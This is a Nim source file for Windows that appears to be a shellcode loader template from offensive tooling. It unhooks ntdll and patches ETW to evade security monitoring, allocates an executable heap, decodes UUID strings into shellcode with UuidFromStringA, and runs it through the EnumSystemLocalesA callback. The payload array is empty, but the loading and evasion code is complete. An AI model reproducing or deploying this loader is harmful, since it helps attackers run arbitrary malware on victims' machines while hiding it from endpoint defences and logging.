import winim
import strutils
import strformat
import ../supports/etw_patch
import ../supports/ntdll_unhook

var arr = allocCStringArray([

])
var count: int = 0

when isMainModule:
  var result_ntdll = ntdllunhook()
  var result_etw = Patchntdll()
  if result_ntdll and result_etw:
    echo fmt"[*] Allocating Heap Memory"
    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    let ha = HeapAlloc(hHeap, 0, 0x100000)
    var hptr = cast[DWORD_PTR](ha)
    if hptr != 0:
        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
    else:
        echo fmt"[-] Heap Alloc Error "
        quit(QuitFailure)

    for i in 0..(count-1):
        var status = UuidFromStringA(cast[RPC_CSTR](arr[i]), cast[ptr UUID](hptr))
        if status != RPC_S_OK:
            if status == RPC_S_INVALID_STRING_UUID:
                echo fmt"[-] Invalid UUID String Detected"
            else:
                echo fmt"[-] Something Went Wrong, Error Code: {status}"
            quit(QuitFailure)
        hptr += 16
    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
    CloseHandle(hHeap)
    quit(QuitSuccess)
  else:
    echo fmt"[-] Something went wrong..."
    quit(QuitFailure)
